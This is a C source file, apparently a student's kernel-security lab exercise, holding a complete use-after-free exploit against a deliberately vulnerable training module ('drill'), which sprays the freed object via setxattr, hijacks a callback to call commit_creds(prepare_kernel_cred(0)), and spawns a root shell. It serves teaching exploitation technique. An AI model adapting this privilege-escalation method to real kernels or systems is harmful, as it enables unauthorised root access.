/*
 * Student ID: U201911803
 * Author: XuBiang 徐必昂
 */

#define _GNU_SOURCE

#include <fcntl.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/xattr.h>
#include <unistd.h>

#define MMAP_SZ 0x2000
#define PAYLOAD_SZ 3300  // MDL: copy DRILL_ITEM_SIZE from kernel module
// XBA: [#define DRILL_ITEM_SIZE 3300] at [drill_mod.c]

/* ============================== Kernel stuff ============================== */

/* Addresses from System.map (no KASLR) */
#define COMMIT_CREDS_PTR 0xffffffff81084370lu         // MDL: fix this symbol
#define PREPARE_KERNEL_CRED_PTR 0xffffffff810845a0lu  // MDL: fix this symbol
// xubiang@ubuntu:~/Desktop/NADP3/EXP5/linux-5.0-rc1$ cat System.map | grep commit_creds
// ffffffff81084370 T commit_creds
// xubiang@ubuntu:~/Desktop/NADP3/EXP5/linux-5.0-rc1$ cat System.map | grep prepare_kernel_cred
// ffffffff810845a0 T prepare_kernel_cred

typedef int __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);

_commit_creds commit_creds = (_commit_creds)COMMIT_CREDS_PTR;
_prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED_PTR;

// XBA: the function to get root permission
void __attribute__((regparm(3))) root_it(unsigned long arg1, bool arg2) {
    commit_creds(prepare_kernel_cred(0));
}

// MDL: copy the definition of drill_item_t here
// XBA: [struct drill_item_t] at [drill_mod.c] and change u32 to uint32_t
struct drill_item_t {
    uint32_t foo;
    void (*callback)(void);
    char bar[1];
};

/* ========================================================================== */

void run_sh(void) {
    pid_t pid = -1;
    char* args[] = {
        "/bin/sh",
        "-i",
        NULL};
    int status = 0;

    pid = fork();

    if (pid < 0) {
        perror("[-] fork()");
        return;
    }

    if (pid == 0) {
        execve("/bin/sh", args, NULL); /* Should not return */
        perror("[-] execve");
        exit(EXIT_FAILURE);
    }

    if (wait(&status) < 0)
        perror("[-] wait");
}

// XBA: pad the buffer with char 'A' and redirect the callback pointer to root_it
void init_payload(char* p, size_t size) {
    struct drill_item_t* item = (struct drill_item_t*)p;

    memset(p, 0x41, size);

    item->callback = (uint64_t)root_it;

    printf("[+] payload:\n");
    printf("\tstart at %p\n", p);
    printf("\tcallback %lx\n", item->callback);
}

// XBA: write operation code to fd
int act(int fd, char code) {
    ssize_t bytes = 0;

    bytes = write(fd, &code, 1);
    if (bytes <= 0) {
        perror("[-] write");
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}

int main(void) {
    unsigned char* spray_data = NULL;
    int ret = EXIT_FAILURE;
    int fd = -1;

    printf("begin as: uid=%d, euid=%d\n", getuid(), geteuid());

    spray_data = mmap(NULL, MMAP_SZ, PROT_READ | PROT_WRITE,
                      MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (spray_data == MAP_FAILED) {
        perror("[-] mmap failed");
        goto end;
    }

    init_payload(spray_data, MMAP_SZ);

    // MDL: echo '1' > /sys/kernel/debug/drill/drill_act
    // MDL: echo '2' > /sys/kernel/debug/drill/drill_act
    // MDL: echo '3' > /sys/kernel/debug/drill/drill_act
    // XBA: alloc & callback & free but not reset the callback pointer
    if ((fd = open("/sys/kernel/debug/drill/drill_act", O_WRONLY)) == -1) {
        perror("[-] open failed");
        goto end;
    }
    if ((ret = act(fd, '1')) == EXIT_FAILURE) {
        perror("[-] act 1 failed");
        goto end;
    }
    if ((ret = act(fd, '2')) == EXIT_FAILURE) {
        perror("[-] act 2 failed");
        goto end;
    }
    if ((ret = act(fd, '3')) == EXIT_FAILURE) {
        perror("[-] act 3 failed");
        goto end;
    }

    // MDL: Why do we call setxattr with such spray_data and PAYLOAD_SZ?
    // XBA: The full and simple version source code of setxattr() is as follows:
    //      full version: setxattr() - https://elixir.bootlin.com/linux/v5.0-rc1/source/fs/xattr.c#L413
    //      simple version: setxattr(*d, const *name, *value, size, flags) {
    //                          ...
    //                          if (size) {
    //                              ...
    //                              kvalue = kvmalloc(size, GFP_KERNEL);
    //                              if (!kvalue)
    //                                      return -ENOMEM;
    //                              if (copy_from_user(kvalue, value, size)) {
    //                                      error = -EFAULT;
    //                                      goto out;
    //                              }
    //                              ...
    //                          }
    //                          ...
    //                      out:
    //                          kvfree(kvalue);
    //                          return error;
    //                      }
    // XBA: kvmalloc() in setxatter() calls kvmalloc_node(), who Uses kmalloc to get the memory but if
    //      the allocation fails then falls back to the vmalloc allocator. Source code is as follows:
    //      kvmalloc() - https://elixir.bootlin.com/linux/v5.0-rc1/source/mm/util.c#L390
    // XBA: The source code of kmalloc() and kfree() is as follows:
    //      kmalloc() - https://elixir.bootlin.com/linux/v5.0-rc1/source/include/linux/slab.h#L531
    //      kfree() - https://elixir.bootlin.com/linux/v5.0-rc1/source/mm/slab.c#L3789
    //      kmalloc() and kfree() implement in slab use slab cache so there is practicable to get the
    //      memory freed last time by malloc.
    // XBA: So we call setxattr with such spray_data and PAYLOAD_SZ to re-alloc the memory used in
    //      module and put payload(i.e. spray_data) whose callback towards to root_it to the memory.
    //      In this case, when call callback(i.e. code '2') next time, the unreset pointer in module
    //      will cause a hijacking of control flow to execute function root_it and get root permission.
    ret = setxattr("./", "foobar", spray_data, PAYLOAD_SZ, 0);
    printf("setxattr returned %d\n", ret);

    // MDL: echo '2' > /sys/kernel/debug/drill/drill_act
    // XBA: callback, now the callback pointer is point to root_it
    if ((ret = act(fd, '2')) == EXIT_FAILURE) {
        perror("[-] act 2 failed");
        goto end;
    }

    if (getuid() == 0 && geteuid() == 0) {
        printf("[+] finish as: uid=0, euid=0, start sh...\n");
        run_sh();
        ret = EXIT_SUCCESS;
    } else {
        printf("[-] need heap spraying\n");
    }

    printf("[+] The End\n");

end:
    if (fd >= 0) {
        ret = close(fd);
        if (ret != 0)
            perror("[-] close fd");
    }

    return ret;
}
